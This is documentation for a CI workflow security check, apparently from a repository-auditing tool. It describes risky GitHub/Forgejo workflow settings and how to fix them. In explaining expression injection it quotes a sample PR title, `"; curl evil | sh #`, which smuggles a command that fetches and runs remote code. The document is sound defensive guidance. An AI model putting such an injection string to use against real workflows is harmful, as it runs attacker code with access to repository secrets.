# ci-security – Risky CI workflow settings

**Category:** Security · **Severity:** MEDIUM (some findings HIGH) · **Automatic fix:** pinning actions only

## What the check looks for

Reads `.github/workflows/*.yml`, `.forgejo/workflows/*.yml` and `.gitea/workflows/*.yml` (read only, nothing is executed):

- **Action not pinned to a commit SHA** – `uses: owner/action@v4` instead of `@<40 hex>`. Medium; **high** for a third-party action (outside `actions/` and `github/`) in a workflow that uses secrets. Local actions (`./…`) and owners listed in `[ci] trusted_action_owners` are not reported.
- **`pull_request_target` checking out PR code** (`ref: ${{ github.event.pull_request.head.sha }}`) – high.
- **Expression injection into `run:`** from fields controlled by the PR or issue author (`github.event.issue.title`, `…pull_request.title`, `github.head_ref`, `…comment.body` …) – high.
- **Broad token permissions** – `permissions: write-all`, or missing `permissions` in a workflow triggered by foreign PRs (`pull_request_target`, `workflow_run`, `issue_comment`) – medium.
- **Secrets printed to the log** – `echo ${{ secrets.X }}`, or `set -x` in a step that uses a secret – medium.
- **`self-hosted` runner in a public repo** (GitHub) – high.

## Why it matters

An action tag (`@v4`) can be moved to different code at any time by the action's author – or by an attacker who takes over their account – and that code then runs with access to your secrets (the `tj-actions/changed-files` case, 2025). `pull_request_target` runs with the repo's permissions, so checking out code from a foreign PR hands those permissions over. A `${{ … }}` expression in `run:` is substituted into the shell before it runs – a PR titled `"; curl evil | sh #` gets executed. A self-hosted runner in a public repo lets a foreign PR run code on your machine.

## Steps

1. **Pin actions to a SHA** with the tag in a comment: `uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4`. The fix does this for you when it can resolve the SHA through the GitHub API (diff preview, commit to the fixes branch). Dependabot / Renovate then keep it up to date.
2. **`pull_request_target`:** do not check out PR code; if you need it, use `pull_request` (without secrets) and pass the result on as an artifact.
3. **Injection:** pass the value through an environment variable and quote it in the shell:

   ```yaml
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: echo "$TITLE"
   ```

4. **Permissions:** put `permissions: contents: read` at the top of the workflow and grant jobs only what they need.
5. **Secrets in the log:** do not print them (`echo`); turn `set -x` off before working with secrets (`set +x`).
6. **Self-hosted runner:** do not use it in a public repo, or require approval for runs from forks (Settings → Actions → *Require approval for all outside collaborators*).
